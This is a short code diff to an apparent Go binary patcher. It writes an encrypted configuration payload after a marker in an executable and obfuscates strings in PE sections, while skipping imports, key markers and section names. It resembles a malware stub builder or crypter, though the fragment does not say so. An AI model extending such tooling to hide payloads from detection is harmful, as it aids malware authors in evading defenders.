@@ -132,7 +132,9 @@ func main() {
 
 	patchedData := make([]byte, len(data))
 	copy(patchedData, data)
-	copy(patchedData[targetIndex+len(marker):], encryptedConfig)
+	finalPayload := make([]byte, 2032)
+	copy(finalPayload, encryptedConfig)
+	copy(patchedData[targetIndex+len(marker):], finalPayload)
 
 	// --- Automated Obfuscation Logic ---
 	rand.Seed(time.Now().UnixNano())
@@ -192,7 +194,7 @@ func main() {
 							j++
 						}
 						length := j - i
-						if length >= 6 && j < len(sectionData) && sectionData[j] == 0 {
+						if length >= 4 && j < len(sectionData) && sectionData[j] == 0 {
 							rva := sec.VirtualAddress + uint32(i)
 							if (rva >= importRVA && rva < importRVA+importSize) ||
 								(start+uint32(i) >= uint32(targetIndex) && start+uint32(i) < uint32(targetIndex+len(marker)+capacity)) {
@@ -204,6 +206,7 @@ func main() {
 							if bytes.Contains(sectionData[i:j], marker) || bytes.Contains(sectionData[i:j], xorKeyMarker) ||
 								strings.Contains(strVal, "BEGIN PUBLIC KEY") || strings.Contains(strVal, "END PUBLIC KEY") ||
 								strings.Contains(strVal, "ABCDEFGHIJKLMNOPQRSTUVWXYZ") || strings.Contains(strVal, "0123456789") ||
+								strings.HasPrefix(strVal, ".") || // Skip section names (.text, .data, etc)
 								isLikelyEncoded(strVal) {
 								i = j + 1
 								continue
